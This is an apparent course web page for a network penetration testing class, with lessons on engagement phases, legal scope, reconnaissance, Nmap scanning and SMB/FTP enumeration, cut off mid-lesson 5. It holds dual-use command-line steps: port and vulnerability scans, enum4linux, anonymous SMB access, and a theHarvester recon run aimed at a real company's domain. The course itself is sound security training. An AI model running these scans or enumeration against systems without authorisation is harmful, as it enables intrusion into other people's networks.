



<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&family=Exo+2:wght@700;800;900&display=swap"
      rel="stylesheet"
    />
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.39.7/dist/umd/supabase.min.js"></script>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
    />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-okaidia.min.css"
    />
    <link rel="stylesheet" href="assets/css/coursepages.css">
    
    <!-- ========== Start: SEO & Schema Enhancement ========== -->
    <title>Network Penetration Testing - Complete Course | CipherHall</title>
    <meta name="description" content="Begin our expert-led Network Penetration Testing course. Learn ethical hacking, from reconnaissance and Nmap scanning to exploitation with Metasploit and professional reporting.">

    
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon.png" />
    <link rel="shortcut icon" href="/favicon.png" type="image/x-icon" />
    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.png" />
    <link rel="canonical" href="https://www.cipherhall.com/courses/network-penetration-testing" />

    <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Course",
      "name": "Network Penetration Testing - Complete Course",
      "description": "A comprehensive, 20-lesson course on how to ethically assess and exploit vulnerabilities in wired networks, covering the full pentesting lifecycle from reconnaissance to reporting.",
      "provider": {
        "@type": "Organization",
        "name": "CipherHall",
        "sameAs": "https://www.cipherhall.com"
      },
      "hasCourseInstance": {
        "@type": "CourseInstance",
        "courseMode": "Online",
        "instructor": {
          "@type": "Person",
          "name": "Jasmine 'Vega' Chen"
        }
      }
    }
    </script>
    <!-- ========== End: SEO & Schema Enhancement ========== -->
</head>
  <body>
    <!-- Loading Screen -->
    <div id="loadingScreen" class="loading-screen">
      <div class="loader-icon">
        <i class="fas fa-graduation-cap"></i>
      </div>
      <div class="loader-text">Loading Course Content...</div>
    </div>

    <!-- Sidebar Overlay for Mobile -->
    <div class="sidebar-overlay" id="sidebarOverlay"></div>

    <!-- Music Player (fixed at top right) -->
    <div class="header-controls">
      <div class="music-dropdown" id="music-dropdown">
        <button class="btn btn-secondary">
          <span id="music-button-text">STUDY MUSIC</span>
          <i id="music-icon" class="fa-solid fa-music"></i>
        </button>
        <div class="music-dropdown-content" id="music-dropdown-content">
          <a
            href="#"
            data-src="https://www.learningcontainer.com/wp-content/uploads/2020/02/Kalimba.mp3"
            >1. Coffee Shop Vibes</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-16.mp3"
            >2. City Lights Lofi</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-15.mp3"
            >3. Mellow Thoughts</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-13.mp3"
            >4. Rainy Mood</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-10.mp3"
            >5. Time Alone</a
          >
          <a href="#" id="stop-music-link"
            ><i class="fa-solid fa-stop-circle"></i> Stop Music</a
          >
        </div>
      </div>

      <button class="btn btn-secondary" id="resetProgressBtn">
        <i class="fas fa-redo"></i>
        Reset Progress
      </button>
    </div>

    <!-- Auth Modal -->
    <div id="authModal" class="modal" style="display: none">
      <div class="modal-overlay"></div>
      <div class="modal-content">
        <span class="close" id="closeAuthModal">&times;</span>
        <div class="auth-tabs">
          <button id="tabSignIn" class="auth-tab active">Sign In</button>
          <button id="tabSignUp" class="auth-tab">Sign Up</button>
        </div>
        <div
          id="authLoader"
          style="display: none; text-align: center; padding: 2rem"
        >
          <i
            class="fas fa-spinner fa-spin fa-2x"
            style="color: var(--color-green)"
          ></i>
          <p style="margin-top: 0.5rem">Authenticating...</p>
        </div>
        <div id="signInForm" class="auth-form">
          <h2>Sign In to CipherHall</h2>
          <button id="googleSignIn" class="btn btn-google">
            <i class="fab fa-google"></i> Continue with Google
          </button>
          <div class="divider"><span>or</span></div>
          <form id="emailSignInForm">
            <input
              type="email"
              id="signInEmail"
              placeholder="Email Address"
              required
            />
            <input
              type="password"
              id="signInPassword"
              placeholder="Password"
              required
            />
            <button type="submit" class="btn btn-primary">Sign In</button>
          </form>
        </div>
        <div id="signUpForm" class="auth-form" style="display: none">
          <h2>Join CipherHall</h2>
          <button id="googleSignUp" class="btn btn-google">
            <i class="fab fa-google"></i> Continue with Google
          </button>
          <div class="divider"><span>or</span></div>
          <form id="emailSignUpForm">
            <input
              type="text"
              id="signUpName"
              placeholder="Full Name"
              required
            />
            <input
              type="email"
              id="signUpEmail"
              placeholder="Email Address"
              required
            />
            <input
              type="password"
              id="signUpPassword"
              placeholder="Password (min. 8 characters)"
              required
            />
            <button type="submit" class="btn btn-secondary">
              Create Account
            </button>
          </form>
        </div>
        <div id="authMessage"></div>
      </div>
    </div>

    <!-- Sidebar -->
    <aside class="sidebar" id="sidebar">
      <div class="sidebar-header">
        <div class="course-info">
          <h1 class="course-title" id="courseTitle">Loading...</h1>
          <div class="course-progress">
            <div class="progress-header">
              <span class="progress-label">Course Progress</span>
              <span class="progress-percentage" id="courseProgressPercent"
                >0%</span
              >
            </div>
            <div class="progress-bar">
              <div
                class="progress-fill"
                id="courseProgressFill"
                style="width: 0%"
              ></div>
            </div>
            <div class="progress-stats">
              <span id="completedLessons">0</span>
              <span id="totalLessons">0</span>
            </div>
          </div>
          <a href="/dashboard" class="back-to-dashboard">
            <i class="fas fa-arrow-left"></i>
            Back to Dashboard
          </a>
        </div>
      </div>

      <nav class="lesson-nav" id="lessonNav">
        <!-- Lessons will be loaded dynamically -->
      </nav>
    </aside>

    <!-- Main Content -->
    <main class="main-content">
      <header class="content-header">
        <div class="lesson-header">
          <div class="lesson-header-left">
            <span class="lesson-number" id="currentLessonNumber">1</span>
            <h1 class="lesson-header-title" id="currentLessonTitle">
              Loading...
            </h1>
          </div>
          <div class="lesson-actions">
            <button class="mbtn btn-primary" id="menuToggle">
              <i class="fas fa-bars"></i>
            </button>
          </div>
        </div>
      </header>

      <div class="content-body" id="contentBody">
        <div class="lesson-content" id="lessonContent">
          <!-- Lesson content will be loaded dynamically -->
        </div>
      </div>

      <footer class="lesson-navigation">
        <div class="nav-info" id="navInfo">Lesson 1 of 10</div>
        <div class="nav-controls">
          <button class="btn btn-secondary" id="prevLessonBtn" disabled>
            <i class="fas fa-chevron-left"></i>
            Previous
          </button>
          <button class="btn btn-primary" id="nextLessonBtn" disabled>
            Next
            <i class="fas fa-chevron-right"></i>
          </button>
        </div>
      </footer>
    </main>

    <!-- Achievement Notification -->
    <div id="achievementNotification" class="achievement-notification">
      <div class="notification-header">
        <div class="notification-icon" id="notificationIcon">
          <i class="fas fa-trophy"></i>
        </div>
        <div class="notification-content">
          <h3 id="notificationTitle">Achievement Unlocked!</h3>
          <p id="notificationDescription">Description here...</p>
        </div>
      </div>
      <div class="notification-reward" id="notificationReward">
        <i class="fas fa-coins"></i>
        <span id="notificationPoints">+100 Points</span>
      </div>
    </div>

    <!-- Toast Notification -->
    <div id="toast" class="toast">
      <span id="toastMessage"></span>
    </div>

    <script>
      // =====================================================
      // SYNCHRONIZED COURSE SYSTEM WITH DASHBOARD INTEGRATION
      // =====================================================

      // Supabase Configuration - Replace with your config
      const supabaseUrl = "https://lzcmzulemfubjaksoqor.supabase.co";
      const supabaseKey =
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imx6Y216dWxlbWZ1Ympha3NvcW9yIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTUzMzM5MDgsImV4cCI6MjA3MDkwOTkwOH0.crhPH4YWtRsr1BJTpAQcmPbWSpwIWRbzoI4sRb2_fPI";
      const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);

      // =====================================================
      // COURSE DATA STRUCTURE - REPLACE WITH YOUR COURSE JSON
      // =====================================================
      const COURSE_DATA = {
        id: "network-penetration-testing",
        title: "Network Penetration Testing",
        description:
          "A comprehensive, 20-lesson course on how to ethically assess and exploit vulnerabilities in wired networks.",
        category: "ethical-hacking",
        difficulty: "Intermediate to Advanced",
        duration: "50 hours",
        instructor: "Jasmine 'Vega' Chen",
        lessons: [
          {
            id: "lesson-1",
            title: "Introduction to Penetration Testing",
            duration: "90 min",
            objectives: [
              "Define penetration testing and its purpose",
              "Outline the standard phases of a penetration test",
              "Understand the critical importance of legal agreements, scope, and ethics",
              "Prepare a virtual lab environment for hands-on exercises",
            ],
            content: {
              overview:
                "Welcome to the world of ethical hacking. This foundational lesson introduces the structured process of penetration testing, a simulated cyberattack against a computer system to evaluate its security. We will cover the phases of a professional engagement, the legal and ethical boundaries that all pentesters must adhere to, and how to set up your own secure virtual lab for the course.",
              sections: [
                {
                  title: "The Phases of a Penetration Test",
                  content:
                    "<p>A professional penetration test is not a random series of attacks; it's a methodical process that typically follows five distinct phases:</p><ol><li><strong>Reconnaissance:</strong> The initial phase of information gathering. This involves discovering as much as possible about the target organization and its network, both passively (without direct contact) and actively (probing the target).</li><li><strong>Scanning:</strong> Using the information from recon, we now actively scan the target network to identify live hosts, open ports, and running services.</li><li><strong>Gaining Access (Exploitation):</strong> This is the 'hacking' phase. Vulnerabilities identified in the previous phases are exploited to gain unauthorized access to a system.</li><li><strong>Maintaining Access (Post-Exploitation):</strong> After gaining a foothold, the goal is to maintain access, escalate privileges to gain deeper control, and pivot to other systems within the network.</li><li><strong>Covering Tracks & Reporting:</strong> The final stage involves removing any tools or backdoors and, most importantly, compiling a detailed professional report that documents all findings, the steps taken to exploit them, and clear guidance on how to remediate the vulnerabilities.</li></ol>",
                  image:
                    "https://images.unsplash.com/photo-1544197150-b2c4c47b0a34?w=800&h=400&fit=crop",
                },
                {
                  title: "Legal, Ethics, and Scope",
                  content:
                    "<p>This is the most important topic in the entire course. The only difference between a penetration tester and a criminal hacker is <strong>permission</strong>. Before conducting any test, you must have a signed, legally binding document that explicitly outlines the rules of engagement.</p><h3>Key Documents and Concepts:</h3><ul><li><strong>Scope Document:</strong> Defines exactly what is 'in scope' (what you are allowed to test, e.g., specific IP ranges) and what is 'out of scope' (what you must not touch). Testing out of scope can lead to legal action and termination of the contract.</li><li><strong>Rules of Engagement (RoE):</strong> Specifies the timeline, contact points, and what to do if a critical vulnerability is found or if a system goes down.</li><li><strong>'Get Out of Jail Free' Card:</strong> A formal letter from the client authorizing you to perform the penetration test, which you should have with you at all times.</li></ul><p>Ethical hacking requires a strong moral compass. The goal is to improve security, not to cause damage or steal information. All data and findings must be kept strictly confidential.</p>",
                  image:
                    "https://images.unsplash.com/photo-1550645612-82f5d2d0b642?w=800&h=400&fit=crop",
                },
              ],
              codeExamples: [
                {
                  title: "Lab: Set Up Kali Linux Lab with Vulnerable VMs",
                  language: "bash",
                  code: "# To practice penetration testing legally and safely, we need an isolated virtual environment.\n\n# Step 1: Install Virtualization Software.\n# Download and install either Oracle VirtualBox (free) or VMware Workstation/Player.\n\n# Step 2: Download the Attacker Machine - Kali Linux.\n# Go to the official Kali Linux website (kali.org) and download the pre-built virtual machine image for your virtualization software. This saves you from having to install it from scratch.\n\n# Step 3: Download Vulnerable Target Machines.\n# We will use several vulnerable-by-design virtual machines.\n# - Metasploitable 2: A Linux VM from Rapid7 full of known vulnerabilities. An excellent starting point.\n# - OWASP Broken Web Apps Project (OWASP BWA): A VM with many different vulnerable web applications.\n# - Search VulnHub (vulnhub.com) for other beginner-friendly 'boot-to-root' challenges.\n\n# Step 4: Configure the Virtual Network.\n# - Import the Kali and vulnerable VMs into your virtualization software.\n# - To isolate your lab, create a 'Host-only' or 'NAT Network' in your hypervisor's network settings.\n# - Configure all your lab VMs (attacker and targets) to use this same isolated network.\n# - This prevents your vulnerable VMs from being exposed to the internet and prevents your attack traffic from leaving your lab.\n\n# Step 5: Verify Connectivity.\n# - Power on your VMs.\n# - Find the IP address of your target VM (e.g., with `ifconfig` or `ip a` on the Metasploitable 2 console).\n# - From your Kali VM, use the `ping` command to ensure you can reach the target machine.",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "What is the primary difference between a penetration tester and a malicious attacker?",
                  options: [
                    "The tools they use",
                    "Their skill level",
                    "Explicit, documented permission",
                    "Their country of origin",
                  ],
                  correct: 2,
                  explanation:
                    "Permission is the legal and ethical line that separates ethical hacking from criminal activity. A professional pentester always operates with a clear scope and signed authorization.",
                },
                {
                  id: 2,
                  question:
                    "What is the first phase of a standard penetration test?",
                  options: [
                    "Exploitation",
                    "Reporting",
                    "Reconnaissance",
                    "Scanning",
                  ],
                  correct: 2,
                  explanation:
                    "The first phase is always Reconnaissance, or information gathering, where the tester learns as much as possible about the target before making direct contact.",
                },
                {
                  id: 3,
                  question: "What is the purpose of a 'Scope' document?",
                  options: [
                    "To list the vulnerabilities found.",
                    "To define which systems and networks are approved for testing and which are not.",
                    "To provide the pentester with root passwords.",
                    "To be a final invoice for the client.",
                  ],
                  correct: 1,
                  explanation:
                    "The scope document is a critical part of the legal agreement that defines the boundaries of the test to prevent accidental damage or legal issues.",
                },
              ],
            },
          },
          {
            id: "lesson-2",
            title: "Information Gathering & Reconnaissance",
            duration: "75 min",
            objectives: [
              "Differentiate between passive and active reconnaissance",
              "Utilize public sources of information for passive recon (WHOIS, DNS records)",
              "Use advanced search engine techniques (Google Dorking)",
              "Discover email addresses and subdomains related to a target",
            ],
            content: {
              overview:
                "Before launching any attacks, a skilled penetration tester becomes a digital detective. This lesson covers the crucial first phase of Reconnaissance, where you gather intelligence about your target to build a map of their digital footprint. We will explore both passive techniques that leave no trace and initial active techniques to verify information.",
              sections: [
                {
                  title: "Passive vs. Active Reconnaissance",
                  content:
                    "<p>Reconnaissance is split into two main categories based on the level of interaction with the target:</p><ul><li><strong>Passive Reconnaissance:</strong> This is the art of gathering information without directly engaging with the target's systems. You are using publicly available information from third-party sources. This is stealthy and will not be detected by the target. Examples include searching company websites, social media, job postings, and using tools like WHOIS and Shodan.</li><li><strong>Active Reconnaissance:</strong> This involves directly probing the target's infrastructure. While this provides more accurate information, it also creates 'noise' that can be detected by security systems like firewalls and Intrusion Detection Systems (IDS). Examples include DNS zone transfers, port scanning, and banner grabbing.</li></ul>",
                  image:
                    "https://images.unsplash.com/photo-1526374965328-5f61d25c0e40?w=800&h=400&fit=crop",
                },
                {
                  title: "Public Information Sources",
                  content:
                    "<p>A wealth of information about any organization is publicly available and can provide critical clues about their technology stack, employees, and network structure.</p><ul><li><strong>WHOIS:</strong> A query protocol used to look up information about the owners of a domain name or an IP address block. It can reveal registrant names, contact emails, and name servers.</li><li><strong>DNS Records:</strong> Querying public DNS servers can reveal IP addresses (A records), mail servers (MX records), and other text information (TXT records) that can sometimes expose internal server names or security policies (SPF records).</li><li><strong>Shodan:</strong> Shodan is a search engine for internet-connected devices. Instead of websites, it finds servers, webcams, IoT devices, and control systems. It can reveal a target's exposed services, device types, and potential vulnerabilities without ever sending a packet to them directly.</li><li><strong>Google Hacking (Dorking):</strong> This involves using advanced search operators in Google (e.g., `site:`, `filetype:`, `inurl:`) to find specific information that is not intended to be public, such as exposed login pages, configuration files, or error messages that leak version information.</li></ul>",
                  image:
                    "https://images.unsplash.com/photo-1510511459019-5dda7724fd87?w=800&h=400&fit=crop",
                },
              ],
              codeExamples: [
                {
                  title: "Lab: Perform Reconnaissance with theHarvester",
                  language: "bash",
                  code: "# theHarvester is a fantastic tool in Kali Linux for automating passive and light active reconnaissance.\n# It gathers emails, subdomains, hosts, employee names, open ports and banners from different public sources.\n\n# Step 1: Launch theHarvester from the Kali terminal.\n# To see its options, just type its name:\ntheharvester\n\n# Step 2: Perform a basic search against a target domain.\n# Let's use a public domain for this example, like 'microsoft.com'.\n# -d specifies the domain.\n# -l limits the number of search results.\n# -b specifies the data source (e.g., google, bing, anubis, shodan, etc.). 'all' will use many sources.\n\ntheharvester -d microsoft.com -l 500 -b google\n\n# Step 3: Run a more comprehensive scan.\n# This command will use all available sources to find information.\n# Note: this will take longer and may require API keys for some sources like Shodan.\ntheharvester -d microsoft.com -b all\n\n# Step 4: Analyze the output.\n# theHarvester will save the results in an XML and HTML file.\n# Review the findings. Look for:\n# - Email addresses: Useful for phishing or password spraying attacks later.\n# - Subdomains and IP addresses: These are your primary targets for the next phase of scanning.\n# - Host names: May reveal the purpose of a server (e.g., dev.microsoft.com, vpn.microsoft.com).",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "Querying a public WHOIS database to find the owner of a domain is an example of what?",
                  options: [
                    "Active Reconnaissance",
                    "Exploitation",
                    "Passive Reconnaissance",
                    "Post-Exploitation",
                  ],
                  correct: 2,
                  explanation:
                    "Passive reconnaissance uses publicly available, third-party sources and does not involve direct interaction with the target's systems, making it stealthy.",
                },
                {
                  id: 2,
                  question:
                    "What kind of information can you find with the Shodan search engine?",
                  options: [
                    "Employee email addresses.",
                    "News articles about a company.",
                    "Internet-connected devices like servers, webcams, and industrial control systems.",
                    "A company's financial records.",
                  ],
                  correct: 2,
                  explanation:
                    "Shodan is a search engine for devices and services, not website content. It is extremely powerful for finding a target's exposed infrastructure.",
                },
                {
                  id: 3,
                  question: "What is 'Google Dorking'?",
                  options: [
                    "A social engineering technique.",
                    "Using advanced search operators to find specific, often sensitive, information that has been indexed by Google.",
                    "A type of denial-of-service attack.",
                    "The process of creating fake Google search results.",
                  ],
                  correct: 1,
                  explanation:
                    "Google Dorking is a form of passive reconnaissance that leverages the power of search engines to uncover misconfigurations and information leakage.",
                },
              ],
            },
          },
          {
            id: "lesson-3",
            title: "Network Scanning with Nmap",
            duration: "90 min",
            objectives: [
              "Explain the purpose of port scanning",
              "Differentiate between TCP and UDP scanning techniques",
              "Use Nmap to perform various scan types (SYN, TCP Connect, UDP)",
              "Perform service version detection and OS fingerprinting",
            ],
            content: {
              overview:
                "With a list of potential targets from our reconnaissance phase, it's time to start probing them directly. This lesson is a deep dive into Nmap (Network Mapper), the most essential and powerful tool for network scanning. We will learn how to discover live hosts, identify open ports and the services running on them, and even make an educated guess at the target's operating system.",
              sections: [
                {
                  title: "The Fundamentals of Port Scanning",
                  content:
                    "<p>A port is a numbered endpoint for communication on a host. A service (like a web server or an SSH server) 'listens' on a specific port for incoming connections. Port scanning is the process of systematically sending packets to a target's ports to determine which ones are open, closed, or filtered.</p><ul><li><strong>Open:</strong> An application is actively accepting connections on this port. This is our primary point of interest.</li><li><strong>Closed:</strong> The host received the probe, but no application is listening on that port. Useful for confirming a host is live.</li><li><strong>Filtered:</strong> Nmap cannot determine if the port is open or closed because a firewall or other filtering device is blocking the probe.</li></ul><p>By identifying open ports, we can map out the 'attack surface' of a target system.</p>",
                  image:
                    "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop",
                },
                {
                  title: "Nmap Scan Types and Techniques",
                  content:
                    "<p>Nmap offers a huge variety of scan types to suit different situations.</p><ul><li><strong>TCP SYN Scan (`-sS`):</strong> This is the default and most popular scan option. It is also known as a 'half-open' scan. Nmap sends a SYN packet (the first step in the TCP handshake) and waits for a response. A SYN/ACK response indicates the port is open, while an RST indicates it is closed. Nmap never completes the handshake, making this scan fast and stealthy. It requires root/administrator privileges.</li><li><strong>TCP Connect Scan (`-sT`):</strong> If a user lacks raw packet privileges, Nmap defaults to this scan. It uses the operating system's `connect()` system call to perform a full three-way TCP handshake with the target. It's less stealthy and slower than a SYN scan.</li><li><strong>UDP Scan (`-sU`):</strong> Scanning for UDP services is slower and more difficult than TCP. This scan sends UDP packets to each port and waits for a response. The lack of a response often implies the port is open, while an 'ICMP Port Unreachable' error means it's closed.</li><li><strong>Version Detection (`-sV`):</strong> This is one of the most useful options. After finding an open port, Nmap will send a series of probes to determine the exact name and version of the service listening on that port (e.g., 'Apache httpd 2.4.29').</li><li><strong>OS Fingerprinting (`-O`):</strong> Nmap can analyze responses to a series of specific TCP and UDP probes to make a very accurate guess about the target's operating system (e.g., 'Linux 4.15' or 'Windows Server 2016').</li></ul>",
                  image:
                    "https://images.unsplash.com/photo-1587620962725-abab7fe55159?w=800&h=400&fit=crop",
                },
              ],
              codeExamples: [
                {
                  title:
                    "Lab: Use Nmap for Discovery, Scanning, and Version Detection",
                  language: "bash",
                  code: "# Replace 'TARGET_IP' with the IP of your vulnerable VM (e.g., Metasploitable 2).\n\n# Step 1: Ping Scan (Host Discovery)\n# Before scanning, find live hosts on the network. The `-sn` flag tells Nmap not to port scan.\nnmap -sn 192.168.56.0/24\n\n# Step 2: Basic TCP SYN Scan\n# This will run a fast scan on the top 1000 most common TCP ports.\n# It requires sudo because it creates raw packets.\nsudo nmap -sS TARGET_IP\n\n# Step 3: Comprehensive Scan with Version Detection and OS Fingerprinting\n# This is a very common and powerful combination of flags for a pentester.\n# -p- : Scan all 65535 TCP ports.\n# -sV : Perform service version detection.\n# -O : Perform OS detection.\n# -T4 : Use a more aggressive timing template to speed up the scan.\n# -v : Increase verbosity to see progress.\nsudo nmap -p- -sV -O -T4 -v TARGET_IP -oN nmap_results.txt\n# The -oN flag saves the output to a text file for later review.\n\n# Step 4: Run an NSE Script Scan\n# The Nmap Scripting Engine (NSE) can run scripts for vulnerability checking and more.\n# The `-sC` flag runs a default set of safe scripts.\n# `--script=vuln` runs scripts in the 'vuln' category to find known vulnerabilities.\nsudo nmap -sC --script=vuln -p 21,22,80,445 TARGET_IP\n\n# Analyze the output from all scans. You now have a detailed map of the target's open ports, services, versions, and potential OS, which is the foundation for the next phase: enumeration and exploitation.",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question: "What is the primary goal of port scanning?",
                  options: [
                    "To crash the target server.",
                    "To find which ports on a host are open, closed, or filtered, and identify the services listening on them.",
                    "To steal data from the target.",
                    "To send a large amount of traffic.",
                  ],
                  correct: 1,
                  explanation:
                    "Port scanning is a discovery technique used to identify the attack surface of a host by finding its listening services.",
                },
                {
                  id: 2,
                  question:
                    "Why is a TCP SYN scan (`-sS`) often preferred over a TCP Connect scan (`-sT`)?",
                  options: [
                    "It is the only scan that works against firewalls.",
                    "It is faster and stealthier because it doesn't complete the full TCP three-way handshake.",
                    "It uses UDP, which is more reliable.",
                    "It does not require root privileges.",
                  ],
                  correct: 1,
                  explanation:
                    "By not completing the handshake, a SYN scan is less likely to be logged by basic services and is significantly faster, making it the default choice for privileged users.",
                },
                {
                  id: 3,
                  question: "What does the Nmap `-sV` flag do?",
                  options: [
                    "It performs a very stealthy scan.",
                    "It probes open ports to determine the specific version of the running service (e.g., Apache 2.4.29).",
                    "It saves the output in a verbose format.",
                    "It tries to guess the target's operating system.",
                  ],
                  correct: 1,
                  explanation:
                    "Version detection (-sV) is critical. Knowing the exact version of a service allows you to search for public exploits that target that specific version.",
                },
              ],
            },
          },
          {
            id: "lesson-4",
            title: "Service Enumeration",
            duration: "90 min",
            objectives: [
              "Define service enumeration and its goal",
              "Perform manual enumeration through banner grabbing",
              "Enumerate common Windows services like SMB",
              "Enumerate common Linux services like NFS and FTP",
              "Understand how enumeration provides data for exploitation",
            ],
            content: {
              overview:
                "Nmap has shown us which doors are open; enumeration is the process of peeking through those doors to see what's inside. This lesson focuses on actively connecting to discovered services to gather more detailed information, such as user accounts, shared resources, and specific software configurations. This granular detail is what often leads directly to an exploitable vulnerability.",
              sections: [
                {
                  title: "What is Enumeration?",
                  content:
                    "<p>Enumeration is the process of extracting granular details from a service. While Nmap's version scan gives us a great starting point (e.g., `vsftpd 2.3.4` on port 21), enumeration aims to answer deeper questions: Does this FTP server allow anonymous login? What files are visible? Are there any writable directories? This detailed information is often the key to gaining a foothold.</p><h3>Banner Grabbing</h3><p>Many services will announce exactly what they are in a 'banner' when you first connect. This is the simplest form of enumeration. Tools like `netcat`, `telnet`, or even Nmap can be used to connect to a port and capture this banner information, which can confirm or add detail to the version scan results.</p>",
                  image:
                    "https://images.unsplash.com/photo-1516110833953-7a916730302b?w=800&h=400&fit=crop",
                },
                {
                  title: "Enumerating Common Services",
                  content:
                    "<p>Different services require different enumeration techniques and tools.</p><ul><li><strong>SMB (Server Message Block - Port 445/139):</strong> This is a goldmine for information on Windows networks (and Linux with Samba). Enumeration can reveal a list of users, groups, machine names, and, most importantly, network shares. Open, world-writable shares are a common and critical vulnerability. Tools like `enum4linux` and `smbclient` are essential here.</li><li><strong>NFS (Network File System - Port 2049):</strong> The Linux equivalent of SMB. Enumerating NFS can reveal shared directories (exports). If these are misconfigured, we may be able to mount them on our attacker machine and directly access files on the target.</li><li><strong>FTP (File Transfer Protocol - Port 21):</strong> The key question is always: does it allow anonymous login? An anonymous login can sometimes give access to sensitive files or writable directories where we can upload a shell.</li><li><strong>SMTP (Simple Mail Transfer Protocol - Port 25):</strong> SMTP servers have commands like `VRFY` (verify user) and `EXPN` (expand mailing list) that can be used to enumerate valid user accounts on the system.</li><li><strong>SNMP (Simple Network Management Protocol - Port 161):</strong> Often poorly secured, SNMP can contain a massive amount of information about a device, including its network configuration, running processes, and user accounts. It uses 'community strings' as passwords, and default strings like 'public' and 'private' are very common.</li></ul>",
                  image:
                    "https://images.unsplash.com/photo-1629834465737-f1c52b34a6c3?w=800&h=400&fit=crop",
                },
              ],
              codeExamples: [
                {
                  title: "Lab: Enumerate SMB Shares and Users with enum4linux",
                  language: "bash",
                  code: "# enum4linux is a powerful enumeration tool for SMB on both Windows and Linux targets.\n# Replace 'TARGET_IP' with the IP of your Metasploitable 2 VM.\n\n# Step 1: Banner Grabbing with Netcat\n# First, let's grab the banner from a service like FTP.\nnc -nv TARGET_IP 21\n\n# Step 2: Full SMB Enumeration with enum4linux\n# The '-a' flag tells the tool to run all simple enumeration options.\n# This will attempt to get the user list, share list, OS info, password policy, and more.\nenum4linux -a TARGET_IP\n\n# Step 3: Analyze the enum4linux output.\n# - Look for the list of 'Share Enumeration'. Are there any interesting shares like 'tmp' or 'public'?\n# - Look at the 'User Enumeration'. You now have a list of valid usernames (e.g., msfadmin, user), which is extremely useful for password attacks.\n# - Look at the OS information. It can confirm what Nmap found.\n\n# Step 4: Manually Connect to an Open SMB Share.\n# Suppose `enum4linux` found a share named 'tmp'. Let's try to connect to it.\n# `smbclient` is used for this. The `-N` flag means no password.\nsmbclient //TARGET_IP/tmp -N\n\n# If successful, you'll be dropped into an 'smb: \\>' prompt.\n# You can use commands like `ls` to list files and `put` or `get` to upload/download files.\n# An anonymous, writable share is a critical finding and a common way to gain a foothold.",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "What is the primary goal of the enumeration phase?",
                  options: [
                    "To perform a port scan.",
                    "To gather detailed, specific information from running services, like usernames, share names, and configurations.",
                    "To crash the target system.",
                    "To write the final pentest report.",
                  ],
                  correct: 1,
                  explanation:
                    "Enumeration goes deeper than scanning. It's about interacting with services to extract granular intelligence that can be used for exploitation.",
                },
                {
                  id: 2,
                  question:
                    "The tool `enum4linux` is used to gather detailed information from which service?",
                  options: [
                    "HTTP (port 80)",
                    "SSH (port 22)",
                    "SMB (port 445)",
                    "DNS (port 53)",
                  ],
                  correct: 2,
                  explanation:
                    "enum4linux is a specialized tool for enumerating the Server Message Block (SMB) protocol, which is fundamental to Windows file sharing and networking.",
                },
                {
                  id: 3,
                  question:
                    "During FTP enumeration, what is the first and most critical thing to check for?",
                  options: [
                    "The server's exact version number.",
                    "Whether anonymous login is enabled.",
                    "The operating system of the server.",
                    "The physical location of the server.",
                  ],
                  correct: 1,
                  explanation:
                    "Anonymous FTP access is a classic, high-impact misconfiguration that can sometimes provide immediate access to sensitive files or writable directories.",
                },
              ],
            },
          },
          {
            id: "lesson-5",
            title: "Vulnerability Scanning",
            duration: "75 min",
            objectives: [
              "Define vulnerability scanning and its place in a penetration test",
              "Understand the difference between authenticated and unauthenticated scans",
              "Identify popular vulnerability scanning tools (Nessus, OpenVAS)",
              "Analyze the output of a vulnerability scanner to identify high-risk findings",
            ],
            content: {
              overview:
                "While manual enumeration is a crucial skill, automated scanners can rapidly and comprehensively test a target against a huge database of known vulnerabilities. This lesson covers the process of vulnerability scanning, using tools like OpenVAS to systematically identify security weaknesses, from missing patches to dangerous default configurations.",
              sections: [
                {
                  title: "What is Vulnerability Scanning?",
                  content:
                    "<p>A vulnerability scanner is an automated tool that actively probes a target system to identify potential security weaknesses. It works by comparing the results of its probes (e.g., service versions, configurations, responses to specific queries) against a database of known vulnerabilities. The output is a prioritized list of potential security issues.</p><p>It's important to understand that a vulnerability scanner is not an 'exploit' button. It identifies <em>potential</em> weaknesses. A key role of a penetration tester is to then <strong>validate</strong> these findings—to prove that a reported vulnerability is real and demonstrate its actual impact.</p>",
                  image:
                    "https://images.unsplash.com/photo-1599507578794-279213135e13?w=800&h=400&fit=crop",
                },
                {
                  title: "Authenticated vs. Unauthenticated Scans",
                  content:
